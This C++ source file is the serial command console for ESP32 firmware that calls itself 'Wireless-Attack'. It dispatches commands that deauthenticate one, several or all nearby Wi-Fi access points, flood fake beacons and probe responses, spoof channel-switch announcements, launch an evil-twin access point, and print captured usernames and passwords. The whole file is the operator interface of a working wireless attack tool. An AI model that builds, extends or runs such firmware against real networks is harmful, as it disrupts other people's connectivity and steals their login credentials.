#include "serial_console.h"

#include <Arduino.h>
#include <WiFi.h>
#include <ctype.h>
#include <esp_system.h>
#include <esp_wifi.h>
#include <sdkconfig.h>
#include <stdlib.h>
#include <string.h>

#include "csa.h"
#include "deauth.h"
#include "definitions.h"
#include "evil_twin.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
#include "wireless_ui.h"
#endif

namespace {

char g_line[112];
size_t g_len = 0;
int g_scan_count = 0;

TaskHandle_t s_scan_task = nullptr;
volatile bool s_scan_busy = false;

const char* auth_name(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:
      return "WPA2/WPA3";
    case WIFI_AUTH_WAPI_PSK:
      return "WAPI";
    default:
      return "UNKNOWN";
  }
}

const char* attack_mode_label() {
  if (evil_twin_mode == EVIL_TWIN_CAPTURING) return "eviltwin";
  if (evil_twin_mode == EVIL_TWIN_DEAUTHING) return "eviltwin-deauth";
  return attack_mode_name();
}

const char* capabilities() {
#if CONFIG_SOC_WIFI_SUPPORT_5G
  return "deauth,eviltwin,probe,5g";
#else
  return "deauth,eviltwin,probe";
#endif
}

void ui_log(const char* text) {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_log(text);
#else
  (void)text;
#endif
}

void mac_to_str(const uint8_t* mac, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4],
           mac[5]);
}

void print_help() {
  Serial.println("INFO Wireless-Attack serial console");
  Serial.println("INFO HELP                          this text");
  Serial.println("INFO PING / STATUS / STATS         liveness, counters, per-AP counters");
  Serial.println("INFO SCAN                          scan APs (async)");
  Serial.println("INFO DEAUTH <idx> [reason]         deauth one AP");
  Serial.println("INFO DEAUTH_ALL [reason]           deauth every scanned AP");
  Serial.println("INFO DEAUTH_ONLY <i,j,..> [reason] deauth only these APs");
  Serial.println("INFO DEAUTH_EXCEPT <i,j,..>        deauth every AP except these");
  Serial.println("INFO STATIONS [sec]                discover client STAs (default 6s)");
  Serial.println("INFO PROBE_BROADCAST               flood fake APs (beacon + probe response)");
  Serial.println("INFO STOP                          stop the current attack");
  Serial.println("INFO EVILTWIN <idx> / EVILTWIN_STOP / CREDS");
  Serial.println("INFO TOUCH / CALIBRATE             LVGL touch readback / recalibrate");
  Serial.println("INFO UITARGETS / UI                LVGL target popup: open / report state");
  Serial.println("INFO RXMIX                         received frame mix (beacon/probe/deauth/ctrl/data)");
  Serial.println("INFO REASON [1-65535|random]       deauth reason code: fixed, random per burst, or report");
  Serial.println("INFO CSA <idx> [ch] [cnt] [secs]   CSA spoof; no ch/auto = random opposite-band channel, loops");
  Serial.println("INFO CSASTOP                       stop the CSA spoof");
  Serial.println("INFO CSATEST                       dump the CSA action/beacon bytes (format check)");
  Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
  Serial.println("INFO UIREASON / UI                 LVGL reason popup: open / report state");
}

// ------------------------------------------------------------------ parsing

int parse_index(char* token) {
  if (token == nullptr) return -1;
  char* end = nullptr;
  const long value = strtol(token, &end, 10);
  if (end == token) return -1;
  return (int)value;
}

enum reason_kind_t { REASON_FIXED = 0, REASON_RANDOM, REASON_BAD };

struct reason_arg_t {
  reason_kind_t kind;
  uint16_t value;
};

bool token_iequals(const char* a, const char* b) {
  if (a == nullptr || b == nullptr) return false;
  while (*a != 0 && *b != 0) {
    if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) return false;
    a++;
    b++;
  }
  return *a == 0 && *b == 0;
}

// Accepted: nothing (default 1), "random"/"rand"/"r", or 1..65535.
// 0 is reserved in the standard and 2 bytes is the field width, so anything
// outside 1..65535 is rejected instead of silently becoming reason 1.
reason_arg_t parse_reason_arg(char* token) {
  reason_arg_t arg = {REASON_FIXED, 1};
  if (token == nullptr) return arg;
  if (token_iequals(token, "random") || token_iequals(token, "rand") ||
      token_iequals(token, "r")) {
    arg.kind = REASON_RANDOM;
    return arg;
  }
  char* end = nullptr;
  const long value = strtol(token, &end, 10);
  if (end == token || *end != 0 || value <= 0 || value > 65535) {
    arg.kind = REASON_BAD;
    return arg;
  }
  arg.value = (uint16_t)value;
  return arg;
}

// Applies a parsed reason; false means "abort this command".
bool apply_reason_arg(const reason_arg_t& arg) {
  if (arg.kind == REASON_BAD) {
    Serial.println("ERR reason must be 1..65535, or 'random'");
    return false;
  }
  if (arg.kind == REASON_RANDOM) {
    attack_set_reason_random();
    return true;
  }
  attack_set_reason(arg.value);
  if (!attack_reason_is_defined(arg.value)) {
    Serial.printf("INFO reason %u is outside the defined set (1-11,13-24), clients may ignore it\n",
                  (unsigned)arg.value);
  }
  return true;
}

int parse_index_list(char* text, int* out, int max) {
  if (text == nullptr) return 0;
  int count = 0;
  char* cursor = text;
  while (cursor != nullptr && *cursor != 0 && count < max) {
    char* next = strchr(cursor, ',');
    if (next != nullptr) {
      *next = 0;
    }
    const int value = parse_index(cursor);
    if (value >= 0) {
      out[count++] = value;
    }
    cursor = (next == nullptr) ? nullptr : next + 1;
  }
  return count;
}

// ------------------------------------------------------------------ commands

void do_scan() {
  prepare_radio_for_scan();
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_scan_begin();
#endif
  g_scan_count = WiFi.scanNetworks();
  Serial.println("SCAN_BEGIN");
  for (int i = 0; i < g_scan_count; i++) {
    Serial.printf("NET %d %d %d %s %s %s\n", i, (int)WiFi.RSSI(i), (int)WiFi.channel(i),
                  auth_name(WiFi.encryptionType(i)), WiFi.BSSIDstr(i).c_str(), WiFi.SSID(i).c_str());
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
    // Keep the String objects alive until the UI has copied the text: taking
    // c_str() straight into the struct leaves dangling pointers.
    const String ui_ssid = WiFi.SSID(i);
    const String ui_bssid = WiFi.BSSIDstr(i);
    const wireless_ui_network_t net = {
        .index = (uint16_t)i,
        .rssi = (int8_t)WiFi.RSSI(i),
        .channel = (uint8_t)WiFi.channel(i),
        .auth = auth_name(WiFi.encryptionType(i)),
        .bssid = ui_bssid.c_str(),
        .ssid = ui_ssid.c_str(),
    };
    wireless_ui_add_network(&net);
#endif
  }
  Serial.printf("SCAN_END %d\n", g_scan_count);
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_scan_end(g_scan_count);
#endif
}

static void scan_task(void* arg) {
  (void)arg;
  for (;;) {
    ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
    do_scan();
    s_scan_busy = false;
  }
}

void start_scan() {
  if (s_scan_task == nullptr) {
    Serial.println("ERR scanner task not ready");
    return;
  }
  if (s_scan_busy) {
    Serial.println("ERR scan already running");
    return;
  }
  s_scan_busy = true;
  xTaskNotifyGive(s_scan_task);
}

void do_status() {
  int ui = 0;
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  ui = wireless_ui_ready() ? 1 : 0;
#endif
  Serial.print("STATUS mode=");
  Serial.print(attack_mode_label());
  Serial.print(" eliminated=");
  Serial.print(eliminated_stations);
  Serial.print(" deauth_frames=");
  Serial.print((unsigned)attack_deauth_frames());
  Serial.print(" probe_frames=");
  Serial.print((unsigned)attack_probe_frames());
  {
    uint8_t prim = 0;
    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
    esp_wifi_get_channel(&prim, &sec);
    Serial.print(" ch=");
    Serial.print((int)prim);
  }
  Serial.print(" rx=");
  Serial.print((unsigned)attack_rx_frames());
  Serial.print(" rxm=");
  Serial.print((unsigned)attack_rx_matches());
  Serial.print(" txok=");
  Serial.print((unsigned)attack_tx_ok());
  Serial.print(" txerr=");
  Serial.print((unsigned)attack_tx_err());
  Serial.print(" txerr_nomem=");
  Serial.print((unsigned)attack_tx_err_nomem());
  Serial.print(" txerr_inval=");
  Serial.print((unsigned)attack_tx_err_invalid());
  Serial.print(" txerr_other=");
  Serial.print((unsigned)attack_tx_err_other());
  Serial.print(" txec=");
  Serial.print(attack_tx_last_err());
  Serial.print(" txdrop=");
  Serial.print((unsigned)attack_tx_dropped());
  Serial.print(" blind=");
  Serial.print((unsigned)attack_blind_frames());
  Serial.print(" rev=");
  Serial.print((unsigned)attack_reverse_frames());
  Serial.print(" csa=");
  Serial.print(csa_phase_name());
  Serial.print(" csaf=");
  Serial.print((unsigned)csa_frames());
  Serial.print(" csac=");
  Serial.print((unsigned)csa_clients());
  Serial.print(" csch=");
  Serial.print((unsigned)csa_new_channel());
  Serial.print(" csaauto=");
  Serial.print(csa_auto_channel() ? 1 : 0);
  Serial.print(" csacycle=");
  Serial.print((unsigned)csa_cycles());
  Serial.print(" reason=");
  if (attack_reason_is_random()) {
    Serial.print("random");
  } else {
    Serial.print((unsigned)attack_reason_last());
  }
  Serial.print(" rlast=");
  Serial.print((unsigned)attack_reason_last());
  Serial.print(" networks=");
  Serial.print(g_scan_count);
  Serial.print(" creds=");
  Serial.print(captured_count);
  Serial.print(" heap=");
  Serial.print((unsigned)esp_get_free_heap_size());
  Serial.print(" ui=");
  Serial.print(ui);
  Serial.print(" caps=");
  Serial.println(capabilities());
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_status(attack_mode_label(), eliminated_stations, g_scan_count, captured_count,
                     attack_deauth_frames(), attack_probe_frames());
#endif
}

void do_stats() {
  const int aps = attack_ap_count();
  Serial.print("STATS_BEGIN mode=");
  Serial.print(attack_mode_label());
  Serial.print(" deauth_frames=");
  Serial.print((unsigned)attack_deauth_frames());
  Serial.print(" probe_frames=");
  Serial.print((unsigned)attack_probe_frames());
  Serial.print(" aps=");
  Serial.println(aps);
  for (int i = 0; i < aps; i++) {
    const uint8_t* bssid = nullptr;
    uint32_t frames = 0;
    uint8_t channel = 0;
    if (!attack_ap_info(i, &bssid, &frames, &channel)) {
      continue;
    }
    char mac[18];
    mac_to_str(bssid, mac);
    Serial.printf("AP %d %s ch%u frames=%u\n", i, mac, (unsigned)channel, (unsigned)frames);
  }
  Serial.println("STATS_END");
}

void do_deauth(int index, uint16_t reason) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  if (!attack_deauth_single(index, reason)) {
    Serial.println("ERR cannot start deauth on that network");
    return;
  }
  Serial.printf("OK DEAUTH %d %s\n", index, WiFi.SSID(index).c_str());
  ui_log("deauth started");
}

// CSA <idx> [new-channel|auto] [count] [hold-seconds]
// Without a channel (or with "auto") the firmware announces a channel from the
// opposite band -- 2.4 GHz AP -> random 5 GHz channel, 5 GHz AP -> random 2.4 GHz
// -- and repeats the announce+hold cycle until CSASTOP. A channel given
// explicitly keeps the old one-shot behaviour.
void do_csa(int index, long channel, long count, long hold_seconds) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    return;
  }
  const bool auto_channel = (channel < 0);
  if (!auto_channel) {
    const bool is_2g = channel >= 1 && channel <= 14;
    const bool is_5g = channel >= 36 && channel <= 196;
    if (!is_2g && !is_5g) {
      Serial.println("ERR new channel must be 1..14 or 36..196");
      return;
    }
    if ((long)WiFi.channel(index) == channel) {
      Serial.println("ERR new channel must differ from the AP channel");
      return;
    }
  }
  if (count < 2 || count > 8) {
    Serial.println("ERR count must be 2..8 (a real AP counts down)");
    return;
  }
  if (hold_seconds < 1 || hold_seconds > 600) {
    Serial.println("ERR hold seconds must be 1..600");
    return;
  }
  const bool loop = auto_channel;
  if (!csa_start(index, auto_channel ? 0 : (uint8_t)channel, (uint8_t)count,
                 (uint16_t)hold_seconds, loop)) {
    Serial.println("ERR cannot start CSA on that network");
    return;
  }
  Serial.printf("OK CSA %d %s count=%ld hold=%lds loop=%d ssid=%s\n", index,
                auto_channel ? "auto(opposite-band)" : "fixed", count, hold_seconds, loop ? 1 : 0,
                WiFi.SSID(index).c_str());
  ui_log("csa started");
}

// MON <channel> <seconds>: passive capture on one channel (0 = hop 1..13).
// Counters are reset on entry, so a following RXMIX describes exactly this window.
void do_monitor(char* ch_token, char* sec_token) {
  const long channel = ch_token ? strtol(ch_token, nullptr, 10) : 0;
  const long seconds = sec_token ? strtol(sec_token, nullptr, 10) : 10;
  if (channel < 0 || channel > 196) {
    Serial.println("ERR monitor channel must be 0 (hop) or 1..196");
    return;
  }
  if (seconds < 1 || seconds > 120) {
    Serial.println("ERR monitor seconds must be 1..120");
    return;
  }
  attack_stop();
  monitor_begin((uint8_t)channel, (uint16_t)seconds);
  Serial.printf("OK MON ch=%ld %lds\n", channel, seconds);
  ui_log("monitor started");
}

void do_csa_test() {
  csa_selftest();
}

void do_csa_stop() {
  const uint32_t frames = csa_frames();
  csa_stop();
  Serial.printf("OK CSASTOP frames=%u\n", (unsigned)frames);
  ui_log("csa stopped");
}

void do_deauth_all(uint16_t reason) {
  if (g_scan_count == 0) {
    Serial.println("ERR no AP list, run SCAN first");
    return;
  }
  if (!attack_deauth_all(reason)) {
    Serial.println("ERR cannot start deauth-all");
    return;
  }
  Serial.printf("OK DEAUTH_ALL aps=%d\n", attack_ap_count());
  ui_log("deauth all started");
}

void do_deauth_list(char* list, uint16_t reason, bool except) {
  int indexes[MAX_AP_TARGETS];
  const int count = parse_index_list(list, indexes, MAX_AP_TARGETS);
  if (count == 0) {
    Serial.println("ERR need an index list, e.g. DEAUTH_ONLY 1,3,5");
    return;
  }
  if (g_scan_count == 0) {
    Serial.println("ERR no AP list, run SCAN first");
    return;
  }
  const bool ok = except ? attack_deauth_except(indexes, count, reason)
                         : attack_deauth_only(indexes, count, reason);
  if (!ok) {
    Serial.println("ERR cannot start that deauth set");
    return;
  }
  Serial.printf("OK %s %d aps\n", except ? "DEAUTH_EXCEPT" : "DEAUTH_ONLY", attack_ap_count());
  ui_log(except ? "deauth except started" : "deauth only started");
}

void do_stop() {
  attack_stop();
  Serial.printf("OK STOP deauth_frames=%u probe_frames=%u\n",
                (unsigned)attack_deauth_frames(), (unsigned)attack_probe_frames());
  ui_log("stopped");
}

void do_probe_broadcast() {
  if (!attack_probe_broadcast()) {
    Serial.println("ERR cannot start probe broadcast");
    return;
  }
  Serial.println("OK PROBE_BROADCAST");
  ui_log("probe broadcast started");
}

void do_stations(char* seconds_token) {
  int seconds = parse_index(seconds_token);
  if (seconds <= 0 || seconds > 60) {
    seconds = 6;
  }
  stations_begin((uint16_t)seconds);
  Serial.printf("OK STATIONS scanning for %ds\n", seconds);
}

void print_stations() {
  Serial.println("STA_BEGIN");
  const int count = stations_count();
  for (int i = 0; i < count; i++) {
    const uint8_t* mac = nullptr;
    const uint8_t* ap = nullptr;
    uint8_t channel = 0;
    int16_t rssi = 0;
    uint32_t frames = 0;
    if (!stations_info(i, &mac, &ap, &channel, &rssi, &frames)) {
      continue;
    }
    char mac_text[18];
    char ap_text[18];
    mac_to_str(mac, mac_text);
    mac_to_str(ap, ap_text);
    Serial.printf("STA %d %s %s ch%u %ddB frames=%u\n", i, mac_text, ap_text, (unsigned)channel,
                  (int)rssi, (unsigned)frames);
  }
  Serial.printf("STA_END %d\n", count);
}

void do_rxlog() {
  const int count = attack_rx_log_count();
  Serial.print("RXLOG_BEGIN ");
  Serial.println(count);
  for (int i = 0; i < count; i++) {
    uint8_t dest[6], src[6], bssid[6], type = 0, subtype = 0;
    uint16_t len = 0;
    if (!attack_rx_log_at(i, dest, src, bssid, &type, &subtype, &len)) continue;
    char d[18], s[18], b[18];
    mac_to_str(dest, d);
    mac_to_str(src, s);
    mac_to_str(bssid, b);
    Serial.print("RX ");
    Serial.print(i);
    Serial.print(" type=");
    Serial.print((unsigned)type);
    Serial.print(" sub=");
    Serial.print((unsigned)subtype);
    Serial.print(" len=");
    Serial.print((unsigned)len);
    Serial.print(" dest=");
    Serial.print(d);
    Serial.print(" src=");
    Serial.print(s);
    Serial.print(" bssid=");
    Serial.print(b);
    uint8_t cat = 0;
    uint8_t act = 0;
    uint8_t nch = 0;
    uint8_t cnt = 0;
    attack_rx_log_info(i, &cat, &act, &nch, &cnt);
    if (subtype == 13) {
      Serial.printf(" cat=%u act=%u nch=%u cnt=%u", (unsigned)cat, (unsigned)act, (unsigned)nch,
                    (unsigned)cnt);
    } else if (cat == 37) {
      Serial.printf(" csa_ie=1 nch=%u cnt=%u", (unsigned)nch, (unsigned)cnt);
    }
    Serial.println();
  }
  const int csa_n = attack_csa_log_count();
  for (int i = 0; i < csa_n; i++) {
    uint8_t src[6] = {0};
    uint8_t nch = 0;
    uint8_t cnt = 0;
    uint8_t cat = 0;
    uint8_t act = 0;
    uint16_t len = 0;
    if (!attack_csa_log_at(i, src, &nch, &cnt, &cat, &act, &len)) continue;
    char s_mac[18];
    mac_to_str(src, s_mac);
    Serial.print("RXCSA ");
    Serial.print(i);
    Serial.print(" src=");
    Serial.print(s_mac);
    Serial.print(" cat=");
    Serial.print((unsigned)cat);
    Serial.print(" act=");
    Serial.print((unsigned)act);
    Serial.print(" nch=");
    Serial.print((unsigned)nch);
    Serial.print(" cnt=");
    Serial.print((unsigned)cnt);
    Serial.print(" len=");
    Serial.println((unsigned)len);
  }
  Serial.println("RXLOG_END");
}

void do_creds() {
  Serial.println("CREDS_BEGIN");
  for (int i = 0; i < captured_count; i++) {
    Serial.printf("CRED %d %s %s %lu\n", i, captured_creds[i].username, captured_creds[i].password,
                  captured_creds[i].timestamp);
  }
  Serial.printf("CREDS_END %d\n", captured_count);
}

void do_evil_twin(int index) {
  if (index < 0 || index >= g_scan_count) {
    Serial.println("ERR index out of range, run SCAN first");
    ui_log("evil twin: index out of range");
    return;
  }
  Serial.printf("OK EVILTWIN %d %s\n", index, WiFi.SSID(index).c_str());
  ui_log("evil twin starting");
  start_evil_twin_attack(index);
}

void do_evil_twin_stop() {
  stop_evil_twin();
  Serial.println("OK EVILTWIN_STOP");
  ui_log("evil twin stopped");
}

void do_touch() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  int raw_x = 0;
  int raw_y = 0;
  int screen_x = 0;
  int screen_y = 0;
  bool pressed = false;
  wireless_ui_touch_readback(&raw_x, &raw_y, &screen_x, &screen_y, &pressed);
  Serial.print("TOUCH raw_x=");
  Serial.print(raw_x);
  Serial.print(" raw_y=");
  Serial.print(raw_y);
  Serial.print(" x=");
  Serial.print(screen_x);
  Serial.print(" y=");
  Serial.print(screen_y);
  Serial.print(" pressed=");
  Serial.print(pressed ? 1 : 0);
  Serial.print(" irq=");
  Serial.println(wireless_ui_touch_irq_level());
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_calibrate() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  Serial.println("OK CALIBRATE, restarting");
  delay(100);
  wireless_ui_request_calibration();
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// Opens the on-screen target picker without touching the panel, so the popup
// can be exercised from the host (same path a finger takes).
void do_ui_targets() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_show_targets();
  Serial.println("OK UITARGETS");
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// Received-frame mix. Run it on a second board (or right after an attack on this
// one) to check what the radio actually hears: beacon / probe response / deauth
// counts plus control and data totals.
void do_rx_mix() {
  uint32_t mgmt[16] = {0};
  uint32_t ctrl = 0;
  uint32_t data = 0;
  attack_rx_mix(mgmt, &ctrl, &data);
  uint32_t other = 0;
  for (int i = 0; i < 16; i++) {
    if (i != 0 && i != 1 && i != 2 && i != 4 && i != 5 && i != 8 && i != 11 && i != 12) {
      other += mgmt[i];
    }
  }
  Serial.print("RXMIX beacon=");
  Serial.print((unsigned)mgmt[8]);
  Serial.print(" proberesp=");
  Serial.print((unsigned)mgmt[5]);
  Serial.print(" probereq=");
  Serial.print((unsigned)mgmt[4]);
  Serial.print(" deauth=");
  Serial.print((unsigned)mgmt[12]);
  Serial.print(" auth=");
  Serial.print((unsigned)mgmt[11]);
  Serial.print(" assoc=");
  Serial.print((unsigned)(mgmt[0] + mgmt[1] + mgmt[2]));
  Serial.print(" other_mgmt=");
  Serial.print((unsigned)other);
  Serial.print(" ctrl=");
  Serial.print((unsigned)ctrl);
  Serial.print(" data=");
  Serial.print((unsigned)data);
  Serial.print(" action=");
  Serial.print((unsigned)attack_rx_action());
  Serial.print(" csa_action=");
  Serial.print((unsigned)attack_rx_csa_action());
  Serial.print(" csa_ie=");
  Serial.println((unsigned)attack_rx_csa_ie());
}

// REASON            -> report the current setting
// REASON 7          -> fixed code
// REASON random     -> random code per burst
void do_reason(char* token) {
  if (token == nullptr) {
    if (attack_reason_is_random()) {
      Serial.printf("REASON random (last=%u)\n", (unsigned)attack_reason_last());
    } else {
      Serial.printf("REASON %u\n", (unsigned)attack_reason_last());
    }
    return;
  }
  const reason_arg_t arg = parse_reason_arg(token);
  if (!apply_reason_arg(arg)) return;
  if (arg.kind == REASON_RANDOM) {
    Serial.println("OK REASON random");
  } else {
    Serial.printf("OK REASON %u\n", (unsigned)arg.value);
  }
}

void do_ui_reasons() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_show_reasons();
  Serial.println("OK UIREASON");
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_ui_state() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  Serial.print("UI screen=");
  Serial.print(wireless_ui_screen_name());
  Serial.print(" popup=");
  Serial.print(wireless_ui_popup_visible() ? 1 : 0);
  Serial.print(" items=");
  Serial.print(wireless_ui_popup_items());
  Serial.print(" rpopup=");
  Serial.print(wireless_ui_reason_popup_visible() ? 1 : 0);
  Serial.print(" ritems=");
  Serial.print(wireless_ui_reason_items());
  Serial.print(" nets=");
  Serial.println(g_scan_count);
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// ------------------------------------------------------------------ dispatch

void dispatch(char* line) {
  char* command = strtok(line, " \t");
  if (command == nullptr) return;
  for (char* p = command; *p != 0; p++) *p = (char)toupper((unsigned char)*p);

  if (strcmp(command, "HELP") == 0) {
    print_help();
  } else if (strcmp(command, "PING") == 0) {
    Serial.println("OK PONG");
  } else if (strcmp(command, "SCAN") == 0) {
    start_scan();
  } else if (strcmp(command, "STATUS") == 0) {
    do_status();
  } else if (strcmp(command, "STATS") == 0) {
    do_stats();
  } else if (strcmp(command, "STOP") == 0) {
    do_stop();
  } else if (strcmp(command, "DEAUTH") == 0) {
    // One strtok per statement: two calls inside one argument list have
    // unspecified evaluation order and corrupt the arguments.
    char* index_token = strtok(nullptr, " \t");
    char* reason_token = strtok(nullptr, " \t");
    const reason_arg_t arg = parse_reason_arg(reason_token);
    if (apply_reason_arg(arg)) do_deauth(parse_index(index_token), arg.value);
  } else if (strcmp(command, "DEAUTH_ALL") == 0) {
    const reason_arg_t arg = parse_reason_arg(strtok(nullptr, " \t"));
    if (apply_reason_arg(arg)) do_deauth_all(arg.value);
  } else if (strcmp(command, "DEAUTH_ONLY") == 0) {
    char* list = strtok(nullptr, " \t");
    char* reason_token = strtok(nullptr, " \t");
    const reason_arg_t arg = parse_reason_arg(reason_token);
    if (apply_reason_arg(arg)) do_deauth_list(list, arg.value, false);
  } else if (strcmp(command, "DEAUTH_EXCEPT") == 0) {
    char* list = strtok(nullptr, " \t");
    char* reason_token = strtok(nullptr, " \t");
    const reason_arg_t arg = parse_reason_arg(reason_token);
    if (apply_reason_arg(arg)) do_deauth_list(list, arg.value, true);
  } else if (strcmp(command, "REASON") == 0) {
    do_reason(strtok(nullptr, " \t"));
  } else if (strcmp(command, "CSA") == 0) {
    char* idx_token = strtok(nullptr, " \t");
    char* ch_token = strtok(nullptr, " \t");
    char* count_token = strtok(nullptr, " \t");
    char* hold_token = strtok(nullptr, " \t");
    const int csa_idx = parse_index(idx_token);
    if (csa_idx < 0) {
      Serial.println("ERR usage: CSA <idx> [new-channel|auto] [count 2-8] [hold-seconds]");
    } else {
      const bool auto_ch = (ch_token == nullptr) || (strcmp(ch_token, "auto") == 0);
      do_csa(csa_idx, auto_ch ? -1 : strtol(ch_token, nullptr, 10),
             auto_ch ? 5 : (count_token ? strtol(count_token, nullptr, 10) : 5),
             auto_ch ? 5 : (hold_token ? strtol(hold_token, nullptr, 10) : 15));
    }
  } else if (strcmp(command, "CSASTOP") == 0) {
    do_csa_stop();
  } else if (strcmp(command, "CSATEST") == 0) {
    do_csa_test();
  } else if (strcmp(command, "MON") == 0) {
    char* ch_token = strtok(nullptr, " 	");
    char* sec_token = strtok(nullptr, " 	");
    do_monitor(ch_token, sec_token);
  } else if (strcmp(command, "STATIONS") == 0) {
    do_stations(strtok(nullptr, " \t"));
    } else if (strcmp(command, "PROBE_BROADCAST") == 0) {
    do_probe_broadcast();
  } else if (strcmp(command, "EVILTWIN") == 0) {
    do_evil_twin(parse_index(strtok(nullptr, " \t")));
  } else if (strcmp(command, "EVILTWIN_STOP") == 0) {
    do_evil_twin_stop();
  } else if (strcmp(command, "CREDS") == 0) {
    do_creds();
  } else if (strcmp(command, "RXLOG") == 0) {
    do_rxlog();
  } else if (strcmp(command, "RXMIX") == 0) {
    do_rx_mix();
  } else if (strcmp(command, "TOUCH") == 0) {
    do_touch();
  } else if (strcmp(command, "UITARGETS") == 0) {
    do_ui_targets();
  } else if (strcmp(command, "UIREASON") == 0) {
    do_ui_reasons();
  } else if (strcmp(command, "UI") == 0) {
    do_ui_state();
  } else if (strcmp(command, "CALIBRATE") == 0) {
    do_calibrate();
  } else {
    Serial.printf("ERR unknown command '%s' (try HELP)\n", command);
    ui_log("unknown command");
  }
}

}  // namespace

void init_serial_console() {
  // The default UART RX ring is 256 bytes; a burst of commands (the GUI, a script,
  // or a pentest harness) overruns it and lines get dropped. Grow it *before*
  // begin() so the driver allocates the bigger ring.
  Serial.setRxBufferSize(SERIAL_RX_BUFFER_SIZE);
  Serial.begin(115200);
  xTaskCreate(scan_task, "scan", 4096, nullptr, 2, &s_scan_task);
  delay(50);
  Serial.println("INFO Wireless-Attack ready, type HELP");
}

void handle_serial_console() {
  if (stations_poll()) {
    print_stations();
  }
  while (Serial.available() > 0) {
    const char c = (char)Serial.read();
    if (c == '\r') continue;
    if (c == '\n') {
      g_line[g_len] = 0;
      if (g_len > 0) dispatch(g_line);
      g_len = 0;
    } else if (g_len < sizeof(g_line) - 1) {
      g_line[g_len++] = c;
    } else {
      g_len = 0;
      Serial.println("ERR line too long");
    }
  }
}

void wireless_console_execute(const char* line) {
  if (line == nullptr) return;
  char buffer[112];
  size_t len = strlen(line);
  if (len >= sizeof(buffer)) len = sizeof(buffer) - 1;
  memcpy(buffer, line, len);
  buffer[len] = 0;
  dispatch(buffer);
}
